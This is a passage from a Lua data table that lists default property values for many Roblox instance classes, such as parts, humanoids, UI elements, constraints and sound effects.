		[""CanvasPosition""] = Vector2.new(0, 0),
		[""CanvasSize""] = UDim2.new(UDim.new(0, 0), UDim.new(2, 0)),
		[""ElasticBehavior""] = Enum.ElasticBehavior.WhenScrollable,
		[""HorizontalScrollBarInset""] = Enum.ScrollBarInset.None,
		[""MidImage""] = ""rbxasset://textures/ui/Scroll/scroll-middle.png"",
		[""ScrollBarImageColor3""] = Color3.new(1, 1, 1),
		[""ScrollBarImageTransparency""] = 0,
		[""ScrollBarThickness""] = 12,
		[""ScrollingDirection""] = Enum.ScrollingDirection.XY,
		[""ScrollingEnabled""] = true,
		[""TopImage""] = ""rbxasset://textures/ui/Scroll/scroll-top.png"",
		[""VerticalScrollBarInset""] = Enum.ScrollBarInset.None,
		[""VerticalScrollBarPosition""] = Enum.VerticalScrollBarPosition.Right
	},
	[""Humanoid""] = {
		[""Archivable""] = true,
		[""Name""] = ""Humanoid"",
		[""Parent""] = ""nill"",
		[""AutoJumpEnabled""] = true,
		[""AutoRotate""] = true,
		[""AutomaticScalingEnabled""] = true,
		[""CameraOffset""] = Vector3.new(0, 0, 0),
		[""DisplayDistanceType""] = Enum.HumanoidDisplayDistanceType.Viewer,
		[""Health""] = 100,
		[""HealthDisplayDistance""] = 100,
		[""HealthDisplayType""] = Enum.HumanoidHealthDisplayType.DisplayWhenDamaged,
		[""HipHeight""] = 0,
		[""Jump""] = false,
		[""JumpPower""] = 50,
		[""MaxHealth""] = 100,
		[""MaxSlopeAngle""] = 89,
		[""NameDisplayDistance""] = 100,
		[""NameOcclusion""] = Enum.NameOcclusion.OccludeAll,
		[""PlatformStand""] = false,
		[""RigType""] = Enum.HumanoidRigType.R6,
		[""Sit""] = false,
		[""TargetPoint""] = Vector3.new(0, 0, 0),
		[""WalkSpeed""] = 16,
		[""WalkToPart""] = ""nill"",
		[""WalkToPoint""] = Vector3.new(0, 0, 0)
	},
	[""CylinderHandleAdornment""] = {
		[""Archivable""] = true,
		[""Name""] = ""CylinderHandleAdornment"",
		[""Parent""] = ""nill"",
		[""Color3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""Transparency""] = 0,
		[""Visible""] = true,
		[""Adornee""] = ""nill"",
		[""AlwaysOnTop""] = false,
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""SizeRelativeOffset""] = Vector3.new(0, 0, 0),
		[""ZIndex""] = -1,
		[""Height""] = 1,
		[""Radius""] = 1
	},
	[""BloomEffect""] = {
		[""Archivable""] = true,
		[""Name""] = ""Bloom"",
		[""Parent""] = ""nill"",
		[""Enabled""] = true,
		[""Intensity""] = 0.4000000059604645,
		[""Size""] = 24,
		[""Threshold""] = 0.949999988079071
	},
	[""Attachment""] = {
		[""Archivable""] = true,
		[""Name""] = ""Attachment"",
		[""Parent""] = ""nill"",
		[""Axis""] = Vector3.new(1, 0, 0),
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""Orientation""] = Vector3.new(-0, 0, 0),
		[""Position""] = Vector3.new(0, 0, 0),
		[""Rotation""] = Vector3.new(-0, 0, -0),
		[""SecondaryAxis""] = Vector3.new(0, 1, 0),
		[""Visible""] = false
	},
	[""WedgePart""] = {
		[""Archivable""] = true,
		[""Name""] = ""Wedge"",
		[""Parent""] = ""nill"",
		[""Anchored""] = false,
		[""BackParamA""] = -0.5,
		[""BackParamB""] = 0.5,
		[""BackSurface""] = Enum.SurfaceType.Smooth,
		[""BackSurfaceInput""] = Enum.InputType.NoInput,
		[""BottomParamA""] = -0.5,
		[""BottomParamB""] = 0.5,
		[""BottomSurface""] = Enum.SurfaceType.Inlet,
		[""BottomSurfaceInput""] = Enum.InputType.NoInput,
		[""BrickColor""] = BrickColor.new(""Medium stone grey""),
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""CanCollide""] = true,
		[""CollisionGroupId""] = 0,
		[""Color""] = Color3.new(0.639216, 0.635294, 0.647059),
		[""CustomPhysicalProperties""] = ""nill"",
		[""FrontParamA""] = -0.5,
		[""FrontParamB""] = 0.5,
		[""FrontSurface""] = Enum.SurfaceType.Smooth,
		[""FrontSurfaceInput""] = Enum.InputType.NoInput,
		[""LeftParamA""] = -0.5,
		[""LeftParamB""] = 0.5,
		[""LeftSurface""] = Enum.SurfaceType.Smooth,
		[""LeftSurfaceInput""] = Enum.InputType.NoInput,
		[""Locked""] = false,
		[""Material""] = Enum.Material.Plastic,
		[""Orientation""] = Vector3.new(0, 0, 0),
		[""Position""] = Vector3.new(0, 0, 0),
		[""Reflectance""] = 0,
		[""RightParamA""] = -0.5,
		[""RightParamB""] = 0.5,
		[""RightSurface""] = Enum.SurfaceType.Smooth,
		[""RightSurfaceInput""] = Enum.InputType.NoInput,
		[""RotVelocity""] = Vector3.new(0, 0, 0),
		[""Rotation""] = Vector3.new(0, 0, 0),
		[""Size""] = Vector3.new(4, 1.2000000476837158, 2),
		[""TopParamA""] = -0.5,
		[""TopParamB""] = 0.5,
		[""TopSurface""] = Enum.SurfaceType.Smooth,
		[""TopSurfaceInput""] = Enum.InputType.NoInput,
		[""Transparency""] = 0,
		[""Velocity""] = Vector3.new(0, 0, 0)
	},
	[""PitchShiftSoundEffect""] = {
		[""Archivable""] = true,
		[""Name""] = ""PitchShiftSoundEffect"",
		[""Parent""] = ""nill"",
		[""Enabled""] = true,
		[""Priority""] = 0,
		[""Octave""] = 1.25
	},
	[""ImageButton""] = {
		[""Archivable""] = true,
		[""Name""] = ""ImageButton"",
		[""Parent""] = ""nill"",
		[""AutoLocalize""] = true,
		[""RootLocalizationTable""] = ""nill"",
		[""Active""] = true,
		[""AnchorPoint""] = Vector2.new(0, 0),
		[""BackgroundColor3""] = Color3.new(0.639216, 0.635294, 0.647059),
		[""BackgroundTransparency""] = 0,
		[""BorderColor3""] = Color3.new(0.105882, 0.164706, 0.207843),
		[""BorderSizePixel""] = 1,
		[""ClipsDescendants""] = false,
		[""LayoutOrder""] = 0,
		[""NextSelectionDown""] = ""nill"",
		[""NextSelectionLeft""] = ""nill"",
		[""NextSelectionRight""] = ""nill"",
		[""NextSelectionUp""] = ""nill"",
		[""Position""] = UDim2.new(UDim.new(0, 0), UDim.new(0, 0)),
		[""Rotation""] = 0,
		[""Selectable""] = true,
		[""SelectionImageObject""] = ""nill"",
		[""Size""] = UDim2.new(UDim.new(0, 0), UDim.new(0, 0)),
		[""SizeConstraint""] = Enum.SizeConstraint.RelativeXY,
		[""Visible""] = true,
		[""ZIndex""] = 1,
		[""AutoButtonColor""] = true,
		[""Modal""] = false,
		[""Selected""] = false,
		[""Style""] = Enum.ButtonStyle.Custom,
		[""HoverImage""] = """",
		[""Image""] = """",
		[""ImageColor3""] = Color3.new(1, 1, 1),
		[""ImageRectOffset""] = Vector2.new(0, 0),
		[""ImageRectSize""] = Vector2.new(0, 0),
		[""ImageTransparency""] = 0,
		[""PressedImage""] = """",
		[""ScaleType""] = Enum.ScaleType.Stretch,
		[""SliceCenter""] = Rect.new(Vector2.new(0, 0), Vector2.new(0, 0)),
		[""SliceScale""] = 1,
		[""TileSize""] = UDim2.new(UDim.new(1, 0), UDim.new(1, 0))
	},
	[""DialogChoice""] = {
		[""Archivable""] = true,
		[""Name""] = ""DialogChoice"",
		[""Parent""] = ""nill"",
		[""GoodbyeChoiceActive""] = true,
		[""GoodbyeDialog""] = """",
		[""ResponseDialog""] = """",
		[""UserDialog""] = """"
	},
	[""NumberValue""] = {
		[""Archivable""] = true,
		[""Name""] = ""Value"",
		[""Parent""] = ""nill"",
		[""Value""] = 0
	},
	[""AnimationController""] = {
		[""Archivable""] = true,
		[""Name""] = ""AnimationController"",
		[""Parent""] = ""nill""
	},
	[""PartOperation""] = {
		[""Archivable""] = true,
		[""Name""] = ""PartOperation"",
		[""Parent""] = ""nill"",
		[""Anchored""] = false,
		[""BackParamA""] = -0.5,
		[""BackParamB""] = 0.5,
		[""BackSurface""] = Enum.SurfaceType.Smooth,
		[""BackSurfaceInput""] = Enum.InputType.NoInput,
		[""BottomParamA""] = -0.5,
		[""BottomParamB""] = 0.5,
		[""BottomSurface""] = Enum.SurfaceType.Smooth,
		[""BottomSurfaceInput""] = Enum.InputType.NoInput,
		[""BrickColor""] = BrickColor.new(""Institutional white""),
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""CanCollide""] = true,
		[""CollisionGroupId""] = 0,
		[""Color""] = Color3.new(1, 1, 1),
		[""CustomPhysicalProperties""] = ""nill"",
		[""FrontParamA""] = -0.5,
		[""FrontParamB""] = 0.5,
		[""FrontSurface""] = Enum.SurfaceType.Smooth,
		[""FrontSurfaceInput""] = Enum.InputType.NoInput,
		[""LeftParamA""] = -0.5,
		[""LeftParamB""] = 0.5,
		[""LeftSurface""] = Enum.SurfaceType.Smooth,
		[""LeftSurfaceInput""] = Enum.InputType.NoInput,
		[""Locked""] = false,
		[""Material""] = Enum.Material.Plastic,
		[""Orientation""] = Vector3.new(0, 0, 0),
		[""Position""] = Vector3.new(0, 0, 0),
		[""Reflectance""] = 0,
		[""RightParamA""] = -0.5,
		[""RightParamB""] = 0.5,
		[""RightSurface""] = Enum.SurfaceType.Smooth,
		[""RightSurfaceInput""] = Enum.InputType.NoInput,
		[""RotVelocity""] = Vector3.new(0, 0, 0),
		[""Rotation""] = Vector3.new(0, 0, 0),
		[""Size""] = Vector3.new(4, 1.2000000476837158, 2),
		[""TopParamA""] = -0.5,
		[""TopParamB""] = 0.5,
		[""TopSurface""] = Enum.SurfaceType.Smooth,
		[""TopSurfaceInput""] = Enum.InputType.NoInput,
		[""Transparency""] = 0,
		[""Velocity""] = Vector3.new(0, 0, 0),
		[""UsePartColor""] = false
	},
	[""WeldConstraint""] = {
		[""Archivable""] = true,
		[""Name""] = ""WeldConstraint"",
		[""Parent""] = ""nill"",
		[""Enabled""] = true,
		[""Part0""] = ""nill"",
		[""Part1""] = ""nill""
	},
	[""Configuration""] = {
		[""Archivable""] = true,
		[""Name""] = ""Configuration"",
		[""Parent""] = ""nill""
	},
	[""Accessory""] = {
		[""Archivable""] = true,
		[""Name""] = ""Accessory"",
		[""Parent""] = ""nill"",
		[""AttachmentForward""] = Vector3.new(-0, -0, -1),
		[""AttachmentPoint""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""AttachmentPos""] = Vector3.new(0, 0, 0),
		[""AttachmentRight""] = Vector3.new(1, 0, 0),
		[""AttachmentUp""] = Vector3.new(0, 1, 0)
	},
	[""LineForce""] = {
		[""Archivable""] = true,
		[""Name""] = ""LineForce"",
		[""Parent""] = ""nill"",
		[""Attachment0""] = ""nill"",
		[""Attachment1""] = ""nill"",
		[""Color""] = BrickColor.new(""Bright blue""),
		[""Enabled""] = true,
		[""Visible""] = false,
		[""ApplyAtCenterOfMass""] = false,
		[""InverseSquareLaw""] = false,
		[""Magnitude""] = 1000,
		[""MaxForce""] = math.huge,
		[""ReactionForceEnabled""] = false
	},
	[""Skin""] = {
		[""Archivable""] = true,
		[""Name""] = ""Skin"",
		[""Parent""] = ""nill"",
		[""SkinColor""] = BrickColor.new(""Cool yellow"")
	},
	[""VirtualInputManager""] = {
		[""Archivable""] = true,
		[""Name""] = ""VirtualInputManager"",
		[""Parent""] = ""nill""
	},
	[""VehicleSeat""] = {
		[""Archivable""] = true,
		[""Name""] = ""VehicleSeat"",
		[""Parent""] = ""nill"",
		[""Anchored""] = false,
		[""BackParamA""] = -0.5,
		[""BackParamB""] = 0.5,
		[""BackSurface""] = Enum.SurfaceType.Smooth,
		[""BackSurfaceInput""] = Enum.InputType.NoInput,
		[""BottomParamA""] = -0.5,
		[""BottomParamB""] = 0.5,
		[""BottomSurface""] = Enum.SurfaceType.Inlet,
		[""BottomSurfaceInput""] = Enum.InputType.NoInput,
		[""BrickColor""] = BrickColor.new(""Medium stone grey""),
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""CanCollide""] = true,
		[""CollisionGroupId""] = 0,
		[""Color""] = Color3.new(0.639216, 0.635294, 0.647059),
		[""CustomPhysicalProperties""] = ""nill"",
		[""FrontParamA""] = -0.5,
		[""FrontParamB""] = 0.5,
		[""FrontSurface""] = Enum.SurfaceType.Smooth,
		[""FrontSurfaceInput""] = Enum.InputType.NoInput,
		[""LeftParamA""] = -0.5,
		[""LeftParamB""] = 0.5,
		[""LeftSurface""] = Enum.SurfaceType.Smooth,
		[""LeftSurfaceInput""] = Enum.InputType.NoInput,
		[""Locked""] = false,
		[""Material""] = Enum.Material.Plastic,
		[""Orientation""] = Vector3.new(0, 0, 0),
		[""Position""] = Vector3.new(0, 0, 0),
		[""Reflectance""] = 0,
		[""RightParamA""] = -0.5,
		[""RightParamB""] = 0.5,
		[""RightSurface""] = Enum.SurfaceType.Smooth,
		[""RightSurfaceInput""] = Enum.InputType.NoInput,
		[""RotVelocity""] = Vector3.new(0, 0, 0),
		[""Rotation""] = Vector3.new(0, 0, 0),
		[""Size""] = Vector3.new(4, 1.2000000476837158, 2),
		[""TopParamA""] = -0.5,
		[""TopParamB""] = 0.5,
		[""TopSurface""] = Enum.SurfaceType.Studs,
		[""TopSurfaceInput""] = Enum.InputType.NoInput,
		[""Transparency""] = 0,
		[""Velocity""] = Vector3.new(0, 0, 0),
		[""Disabled""] = false,
		[""HeadsUpDisplay""] = true,
		[""MaxSpeed""] = 25,
		[""Steer""] = 0,
		[""SteerFloat""] = 0,
		[""Throttle""] = 0,
		[""ThrottleFloat""] = 0,
		[""Torque""] = 10,
		[""TurnSpeed""] = 1
	},
	[""Vector3Value""] = {
		[""Archivable""] = true,
		[""Name""] = ""Value"",
		[""Parent""] = ""nill"",
		[""Value""] = Vector3.new(0, 0, 0)
	},
	[""Animation""] = {
		[""Archivable""] = true,
		[""Name""] = ""Animation"",
		[""Parent""] = ""nill"",
		[""AnimationId""] = """"
	},
	[""IntConstrainedValue""] = {
		[""Archivable""] = true,
		[""Name""] = ""Value"",
		[""Parent""] = ""nill"",
		[""MaxValue""] = 10,
		[""MinValue""] = 0,
		[""Value""] = 0
	},
	[""FlyweightService""] = {
		[""Archivable""] = true,
		[""Name""] = ""FlyweightService"",
		[""Parent""] = ""nill""
	},
	[""CylindricalConstraint""] = {
		[""Archivable""] = true,
		[""Name""] = ""CylindricalConstraint"",
		[""Parent""] = ""nill"",
		[""Attachment0""] = ""nill"",
		[""Attachment1""] = ""nill"",
		[""Color""] = BrickColor.new(""New Yeller""),
		[""Enabled""] = true,
		[""Visible""] = false,
		[""ActuatorType""] = Enum.ActuatorType.None,
		[""LimitsEnabled""] = false,
		[""LowerLimit""] = 0,
		[""MotorMaxAcceleration""] = math.huge,
		[""MotorMaxForce""] = 0,
		[""Restitution""] = 0,
		[""ServoMaxForce""] = 0,
		[""Size""] = 0.15000000596046448,
		[""Speed""] = 0,
		[""TargetPosition""] = 0,
		[""UpperLimit""] = 5,
		[""Velocity""] = 0,
		[""AngularActuatorType""] = Enum.ActuatorType.None,
		[""AngularLimitsEnabled""] = false,
		[""AngularRestitution""] = 0,
		[""AngularSpeed""] = 0,
		[""AngularVelocity""] = 0,
		[""InclinationAngle""] = 0,
		[""LowerAngle""] = -45,
		[""MotorMaxAngularAcceleration""] = 500000,
		[""MotorMaxTorque""] = 0,
		[""RotationAxisVisible""] = false,
		[""ServoMaxTorque""] = 0,
		[""TargetAngle""] = 0,
		[""UpperAngle""] = 45
	},
	[""MotorFeature""] = {
		[""Archivable""] = true,
		[""Name""] = ""MotorFeature"",
		[""Parent""] = ""nill"",
		[""FaceId""] = Enum.NormalId.Right,
		[""InOut""] = Enum.InOut.Center,
		[""LeftRight""] = Enum.LeftRight.Center,
		[""TopBottom""] = Enum.TopBottom.Center
	},
	[""EqualizerSoundEffect""] = {
		[""Archivable""] = true,
		[""Name""] = ""EqualizerSoundEffect"",
		[""Parent""] = ""nill"",
		[""Enabled""] = true,
		[""Priority""] = 0,
		[""HighGain""] = 0,
		[""LowGain""] = -20,
		[""MidGain""] = -10
	},
	[""Model""] = {
		[""Archivable""] = true,
		[""Name""] = ""Model"",
		[""Parent""] = ""nill"",
		[""PrimaryPart""] = ""nill""
	},
	[""Snap""] = {
		[""Archivable""] = true,
		[""Name""] = ""Snap"",
		[""Parent""] = ""nill"",
		[""C0""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""C1""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""Part0""] = ""nill"",
		[""Part1""] = ""nill""
	},
	[""BodyAngularVelocity""] = {
		[""Archivable""] = true,
		[""Name""] = ""BodyAngularVelocity"",
		[""Parent""] = ""nill"",
		[""AngularVelocity""] = Vector3.new(0, 2, 0),
		[""MaxTorque""] = Vector3.new(4000, 4000, 4000),
		[""P""] = 1250
	},
	[""VelocityMotor""] = {
		[""Archivable""] = true,
		[""Name""] = ""VelocityMotor"",
		[""Parent""] = ""nill"",
		[""C0""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""C1""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""Part0""] = ""nill"",
		[""Part1""] = ""nill"",
		[""CurrentAngle""] = 0,
		[""DesiredAngle""] = 0,
		[""Hole""] = ""nill"",
		[""MaxVelocity""] = 0
	},
	[""UITableLayout""] = {
		[""Archivable""] = true,
		[""Name""] = ""UITableLayout"",
		[""Parent""] = ""nill"",
		[""FillDirection""] = Enum.FillDirection.Vertical,
		[""HorizontalAlignment""] = Enum.HorizontalAlignment.Left,
		[""SortOrder""] = Enum.SortOrder.Name,
		[""VerticalAlignment""] = Enum.VerticalAlignment.Top,
		[""FillEmptySpaceColumns""] = false,
		[""FillEmptySpaceRows""] = false,
		[""MajorAxis""] = Enum.TableMajorAxis.RowMajor,
		[""Padding""] = UDim2.new(UDim.new(0, 0), UDim.new(0, 0))
	},
	[""Part""] = {
		[""Archivable""] = true,
		[""Name""] = ""Part"",
		[""Parent""] = ""nill"",
		[""Anchored""] = false,
		[""BackParamA""] = -0.5,
		[""BackParamB""] = 0.5,
		[""BackSurface""] = Enum.SurfaceType.Smooth,
		[""BackSurfaceInput""] = Enum.InputType.NoInput,
		[""BottomParamA""] = -0.5,
		[""BottomParamB""] = 0.5,
		[""BottomSurface""] = Enum.SurfaceType.Inlet,
		[""BottomSurfaceInput""] = Enum.InputType.NoInput,
		[""BrickColor""] = BrickColor.new(""Medium stone grey""),
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""CanCollide""] = true,
		[""CollisionGroupId""] = 0,
		[""Color""] = Color3.new(0.639216, 0.635294, 0.647059),
		[""CustomPhysicalProperties""] = ""nill"",
		[""FrontParamA""] = -0.5,
		[""FrontParamB""] = 0.5,
		[""FrontSurface""] = Enum.SurfaceType.Smooth,
		[""FrontSurfaceInput""] = Enum.InputType.NoInput,
		[""LeftParamA""] = -0.5,
		[""LeftParamB""] = 0.5,
		[""LeftSurface""] = Enum.SurfaceType.Smooth,
		[""LeftSurfaceInput""] = Enum.InputType.NoInput,
		[""Locked""] = false,
		[""Material""] = Enum.Material.Plastic,
		[""Orientation""] = Vector3.new(0, 0, 0),
		[""Position""] = Vector3.new(0, 0, 0),
		[""Reflectance""] = 0,
		[""RightParamA""] = -0.5,
		[""RightParamB""] = 0.5,
		[""RightSurface""] = Enum.SurfaceType.Smooth,
		[""RightSurfaceInput""] = Enum.InputType.NoInput,
		[""RotVelocity""] = Vector3.new(0, 0, 0),
		[""Rotation""] = Vector3.new(0, 0, 0),
		[""Size""] = Vector3.new(4, 1.2000000476837158, 2),
		[""TopParamA""] = -0.5,
		[""TopParamB""] = 0.5,
		[""TopSurface""] = Enum.SurfaceType.Studs,
		[""TopSurfaceInput""] = Enum.InputType.NoInput,
		[""Transparency""] = 0,
		[""Velocity""] = Vector3.new(0, 0, 0),
		[""Shape""] = Enum.PartType.Block
	},
	[""UISizeConstraint""] = {
		[""Archivable""] = true,
		[""Name""] = ""UISizeConstraint"",
		[""Parent""] = ""nill"",
		[""MaxSize""] = Vector2.new(inf, inf),
		[""MinSize""] = Vector2.new(0, 0)
	},
	[""TremoloSoundEffect""] = {
		[""Archivable""] = true,
		[""Name""] = ""TremoloSoundEffect"",
		[""Parent""] = ""nill"",
		[""Enabled""] = true,
		[""Priority""] = 0,
		[""Depth""] = 1,
		[""Duty""] = 0.5,
		[""Frequency""] = 5
	},
	[""ArcHandles""] = {
		[""Archivable""] = true,
		[""Name""] = ""ArcHandles"",
		[""Parent""] = ""nill"",
		[""Color3""] = Color3.new(0.0509804, 0.411765, 0.67451),
		[""Transparency""] = 0,
		[""Visible""] = true,
		[""Adornee""] = ""nill"",
		[""Axes""] = X, Y, Z
	},
	[""Hint""] = {
		[""Archivable""] = true,
		[""Name""] = ""Message"",
		[""Parent""] = ""nill"",
		[""Text""] = """"
	},
	[""UIAspectRatioConstraint""] = {
		[""Archivable""] = true,
		[""Name""] = ""UIAspectRatioConstraint"",
		[""Parent""] = ""nill"",
		[""AspectRatio""] = 1,
		[""AspectType""] = Enum.AspectType.FitWithinMaxSize,
		[""DominantAxis""] = Enum.DominantAxis.Width
	},
	[""VehicleController""] = {
		[""Archivable""] = true,
		[""Name""] = ""Instance"",
		[""Parent""] = ""nill""
	},
	[""RayValue""] = {
		[""Archivable""] = true,
		[""Name""] = ""Value"",
		[""Parent""] = ""nill"",
		[""Value""] = Ray.new(Vector3.new(0, 0, 0), Vector3.new(0, 0, 0))
	},
	[""RotateP""] = {
		[""Archivable""] = true,
		[""Name""] = ""RotateP"",
		[""Parent""] = ""nill"",
		[""C0""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""C1""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""Part0""] = ""nill"",
		[""Part1""] = ""nill"",
		[""BaseAngle""] = 0
	},
	[""Camera""] = {
		[""Archivable""] = true,
		[""Name""] = ""Camera"",
		[""Parent""] = ""nill"",
		[""CFrame""] = CFrame.new(0, 20, 20, 1, 0, -0, 0, 0.707106829, 0.707106829, 0, -0.707106829, 0.707106829),
		[""CameraSubject""] = ""nill"",
		[""CameraType""] = Enum.CameraType.Fixed,
		[""FieldOfView""] = 70,
		[""Focus""] = CFrame.new(0, 0, -5, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""HeadLocked""] = true,
		[""HeadScale""] = 1
	},
	[""LocalizationTable""] = {
		[""Archivable""] = true,
		[""Name""] = ""LocalizationTable"",
		[""Parent""] = ""nill"",
		[""SourceLocaleId""] = ""en-us""
	},
	[""TrussPart""] = {
		[""Archivable""] = true,
		[""Name""] = ""Truss"",
		[""Parent""] = ""nill"",
		[""Anchored""] = false,
		[""BackParamA""] = -0.5,
		[""BackParamB""] = 0.5,
		[""BackSurface""] = Enum.SurfaceType.Universal,
		[""BackSurfaceInput""] = Enum.InputType.NoInput,
		[""BottomParamA""] = -0.5,
		[""BottomParamB""] = 0.5,
		[""BottomSurface""] = Enum.SurfaceType.Universal,
		[""BottomSurfaceInput""] = Enum.InputType.NoInput,
		[""BrickColor""] = BrickColor.new(""Medium stone grey""),
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""CanCollide""] = true,
		[""CollisionGroupId""] = 0,
		[""Color""] = Color3.new(0.639216, 0.635294, 0.647059),
		[""CustomPhysicalProperties""] = ""nill"",
		[""FrontParamA""] = -0.5,
		[""FrontParamB""] = 0.5,
		[""FrontSurface""] = Enum.SurfaceType.Universal,
		[""FrontSurfaceInput""] = Enum.InputType.NoInput,
		[""LeftParamA""] = -0.5,
		[""LeftParamB""] = 0.5,
		[""LeftSurface""] = Enum.SurfaceType.Universal,
		[""LeftSurfaceInput""] = Enum.InputType.NoInput,
		[""Locked""] = false,
		[""Material""] = Enum.Material.Plastic,
		[""Orientation""] = Vector3.new(0, 0, 0),
		[""Position""] = Vector3.new(0, 0, 0),
		[""Reflectance""] = 0,
		[""RightParamA""] = -0.5,
		[""RightParamB""] = 0.5,
		[""RightSurface""] = Enum.SurfaceType.Universal,
		[""RightSurfaceInput""] = Enum.InputType.NoInput,
		[""RotVelocity""] = Vector3.new(0, 0, 0),
		[""Rotation""] = Vector3.new(0, 0, 0),
		[""Size""] = Vector3.new(2, 2, 2),
		[""TopParamA""] = -0.5,
		[""TopParamB""] = 0.5,
		[""TopSurface""] = Enum.SurfaceType.Universal,
		[""TopSurfaceInput""] = Enum.InputType.NoInput,
		[""Transparency""] = 0,
		[""Velocity""] = Vector3.new(0, 0, 0),
		[""Style""] = Enum.Style.AlternatingSupports
	},
	[""BodyForce""] = {
		[""Archivable""] = true,
		[""Name""] = ""BodyForce"",
		[""Parent""] = ""nill"",
		[""Force""] = Vector3.new(0, 1, 0)
	},
	[""UIPageLayout""] = {
		[""Archivable""] = true,
		[""Name""] = ""UIPageLayout"",
		[""Parent""] = ""nill"",
		[""FillDirection""] = Enum.FillDirection.Horizontal,
		[""HorizontalAlignment""] = Enum.HorizontalAlignment.Left,
		[""SortOrder""] = Enum.SortOrder.Name,
		[""VerticalAlignment""] = Enum.VerticalAlignment.Top,
		[""Animated""] = true,
		[""Circular""] = false,
		[""EasingDirection""] = Enum.EasingDirection.Out,
		[""EasingStyle""] = Enum.EasingStyle.Back,
		[""GamepadInputEnabled""] = true,
		[""Padding""] = UDim.new(0, 0),
		[""ScrollWheelInputEnabled""] = true,
		[""TouchInputEnabled""] = true,
		[""TweenTime""] = 1
	},
	[""DistortionSoundEffect""] = {
		[""Archivable""] = true,
		[""Name""] = ""DistortionSoundEffect"",
		[""Parent""] = ""nill"",
		[""Enabled""] = true,
		[""Priority""] = 0,
		[""Level""] = 0.75
	},
	[""MeshPart""] = {
		[""Archivable""] = true,
		[""Name""] = ""MeshPart"",
		[""Parent""] = ""nill"",
		[""Anchored""] = false,
		[""BackParamA""] = -0.5,
		[""BackParamB""] = 0.5,
		[""BackSurface""] = Enum.SurfaceType.Smooth,
		[""BackSurfaceInput""] = Enum.InputType.NoInput,
		[""BottomParamA""] = -0.5,
		[""BottomParamB""] = 0.5,
		[""BottomSurface""] = Enum.SurfaceType.Smooth,
		[""BottomSurfaceInput""] = Enum.InputType.NoInput,
		[""BrickColor""] = BrickColor.new(""Medium stone grey""),
		[""CFrame""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""CanCollide""] = true,
		[""CollisionGroupId""] = 0,
		[""Color""] = Color3.new(0.639216, 0.635294, 0.647059),
		[""CustomPhysicalProperties""] = ""nill"",
		[""FrontParamA""] = -0.5,
		[""FrontParamB""] = 0.5,
		[""FrontSurface""] = Enum.SurfaceType.Smooth,
		[""FrontSurfaceInput""] = Enum.InputType.NoInput,
		[""LeftParamA""] = -0.5,
		[""LeftParamB""] = 0.5,
		[""LeftSurface""] = Enum.SurfaceType.Smooth,
		[""LeftSurfaceInput""] = Enum.InputType.NoInput,
		[""Locked""] = false,
		[""Material""] = Enum.Material.Plastic,
		[""Orientation""] = Vector3.new(0, 0, 0),
		[""Position""] = Vector3.new(0, 0, 0),
		[""Reflectance""] = 0,
		[""RightParamA""] = -0.5,
		[""RightParamB""] = 0.5,
		[""RightSurface""] = Enum.SurfaceType.Smooth,
		[""RightSurfaceInput""] = Enum.InputType.NoInput,
		[""RotVelocity""] = Vector3.new(0, 0, 0),
		[""Rotation""] = Vector3.new(0, 0, 0),
		[""Size""] = Vector3.new(4, 1.2000000476837158, 2),
		[""TopParamA""] = -0.5,
		[""TopParamB""] = 0.5,
		[""TopSurface""] = Enum.SurfaceType.Smooth,
		[""TopSurfaceInput""] = Enum.InputType.NoInput,
		[""Transparency""] = 0,
		[""Velocity""] = Vector3.new(0, 0, 0),
		[""TextureID""] = """"
	},
	[""UIPadding""] = {
		[""Archivable""] = true,
		[""Name""] = ""UIPadding"",
		[""Parent""] = ""nill"",
		[""PaddingBottom""] = UDim.new(0, 0),
		[""PaddingLeft""] = UDim.new(0, 0),
		[""PaddingRight""] = UDim.new(0, 0),
		[""PaddingTop""] = UDim.new(0, 0)
	},
	[""Tool""] = {
		[""Archivable""] = true,
		[""Name""] = ""Tool"",
		[""Parent""] = ""nill"",
		[""TextureId""] = """",
		[""CanBeDropped""] = true,
		[""Enabled""] = true,
		[""Grip""] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),
		[""GripForward""] = Vector3.new(-0, -0, -1),
		[""GripPos""] = Vector3.new(0, 0, 0),
		[""GripRight""] = Vector3.new(1, 0, 0),
		[""GripUp""] = Vector3.new(0, 1, 0),
		[""ManualActivationOnly""] = false,
		[""RequiresHandle""] = true,
		[""ToolTip""] = """"
	},
	[""Explosion""] = {
		[""Archivable""] = true,
		[""Name""] = ""Explosion"",
		[""Parent""] = ""nill"",
		[""BlastPressure""] = 500000,
		[""BlastRadius""] = 4,
		[""DestroyJointRadiusPercent""] = 1,
		[""ExplosionType""] = Enum.ExplosionType.Craters,
		[""Position""] = Vector3.new(0, 0, 0),
		[""Visible""] = true
	},
	[""TextLabel""] = {
		[""Archivable""] = true,
		[""Name""] = ""TextLabel"",
		[""Parent""] = ""nill"",
		[""AutoLocalize""] = true,
		[""RootLocalizationTable""] = ""nill"",
		[""Active""] = false,
		[""AnchorPoint""] = Vector2.new(0, 0),
		[""BackgroundColor3""] = Color3.new(0.639216, 0.635294, 0.647059),
